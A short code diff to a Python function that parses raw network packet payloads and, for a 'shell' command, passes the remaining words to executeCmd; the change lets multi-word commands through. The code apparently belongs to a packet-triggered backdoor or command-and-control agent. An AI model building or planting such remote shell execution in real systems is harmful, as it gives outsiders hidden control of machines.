@@ -57,8 +57,10 @@ def parsePacket(packet):
             return
         payload = packet['Raw'].load
         payload = payload.decode("utf8")
-        cmdType, cmdString = payload.split(' ')
+        cmd = payload.split(' ')
+        cmdType = cmd[0]
         if cmdType == "shell":
+            cmdString = ' '.join(string for string in cmd[1:])
             executeCmd(packet, cmdString)
             sys.exit(0)
         elif cmdType == "exit":
